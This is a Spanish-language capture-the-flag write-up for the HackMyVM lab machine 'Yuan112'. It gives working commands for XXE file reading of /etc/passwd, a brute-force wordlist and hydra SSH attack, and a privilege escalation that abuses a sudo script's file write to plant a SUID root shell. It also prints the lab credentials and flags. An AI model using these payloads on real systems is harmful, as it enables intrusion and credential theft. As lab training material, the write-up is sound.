# 🖥️ Yuan112 - HackMyVM

> **Dificultad:** Easy  
> **OS:** Debian  
> **IP:** 192.168.0.10  
> **Fecha:** 2026-03-30

---

## 📡 Reconocimiento

```bash
sudo arp-scan -l
sudo nmap -p- --min-rate 5000 -n -Pn 192.168.0.10 -oN puertos
sudo nmap -p 22,80 -sS -sC -sV -n -Pn 192.168.0.10 -oN servicios
sudo nmap -sU -p1-200 192.168.0.10 -oN udp
```

**Puertos abiertos TCP:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 8.4p1 |
| 80/tcp | HTTP | Apache 2.4.62 |

**UDP:** Sin puertos relevantes (solo 68/udp dhcpc)

---

## 🌐 Web (puerto 80) — XML Parser

- Título: `XML Parser`
- Formulario que acepta XML y lo parsea con PHP SimpleXML
- Sin directorios adicionales (gobuster)
- **Vulnerable a XXE** — sin sanitización de input

---

## 💉 XXE — Lectura de /etc/passwd

```bash
curl -s -X POST http://192.168.0.10 \
  --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
```

**Hallazgo clave en campo GECOS:**
```
tuf:x:1000:1000:KQNPHFqG**JHcYJossIe:/home/tuf:/bin/bash
```

Los `**` son dos caracteres redactados — pista para bruteforcear.

---

## 🔑 Generación de wordlist

**Técnica:** Python con itertools para generar todas las combinaciones de 2 caracteres

```python
#!/usr/bin/env python3
import string
import itertools

base_pattern = "KQNPHFqG**JHcYJossIe"
possible_chars = string.ascii_letters + string.digits  # 62 chars

passwords = []
for combo in itertools.product(possible_chars, repeat=2):
    new_pass = base_pattern.replace("**", "".join(combo))
    passwords.append(new_pass)

with open("/tmp/yuan112passwords.txt", "w") as f:
    for pw in passwords:
        f.write(pw + "\n")
# Total: 62 * 62 = 3844 combinaciones
```

```bash
python3 /tmp/112pass.py
hydra -l tuf -P /tmp/yuan112passwords.txt ssh://192.168.0.10 -t 16 -I
```

---

## 🔓 Acceso inicial — usuario tuf

**Credenciales encontradas:** `tuf:KQNPHFqG6mJHcYJossIe`

```bash
ssh tuf@192.168.0.10
```

**Flag user:**
```
flag{user-b1e12c74f19aac8e57f6fca1ff472905}
```

---

## ⬆️ Escalada de privilegios — root

```bash
sudo -l
# (ALL) NOPASSWD: /opt/112.sh
cat /opt/112.sh
```

**Vulnerabilidad:** Arbitrary File Write + Bash label abuse

El script valida que la URL empiece por `https://maze-sec.com/` y escribe el resultado en un archivo con `-o`. Se puede sobreescribir el propio script.

Bash interpreta `https://maze-sec.com/tools/pwn` como:
- `https:` → label
- `//maze-sec.com/tools/pwn` → ruta del ejecutable

```bash
# Crear estructura de directorios con payload
cd /tmp
mkdir -p "/tmp/https://maze-sec.com/tools"
tee "/tmp/https://maze-sec.com/tools/pwn" << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
EOF
chmod +x "/tmp/https://maze-sec.com/tools/pwn"

# Sobreescribir el script con la URL maliciosa
sudo /opt/112.sh -u "https://maze-sec.com/tools/pwn" -o /opt/112.sh

# Ejecutar desde /tmp para que encuentre el ejecutable
cd /tmp
sudo /opt/112.sh

# Shell de root
/tmp/rootbash -p
```

**Flag root:**
```
flag{root-538dc127225a0c97b060b1ff9570390a}
```

---

## 📝 Lecciones aprendidas

- XXE puede revelar información crítica — siempre probar en formularios XML
- El campo GECOS del `/etc/passwd` puede contener contraseñas parciales
- `itertools.product` es perfecto para generar wordlists de fuerza bruta dirigida
- Arbitrary File Write como root = escalada de privilegios casi garantizada
- Bash interpreta `scheme://path` como label + ruta absoluta
- Ejecutar el exploit desde `/tmp` para que bash encuentre el ejecutable
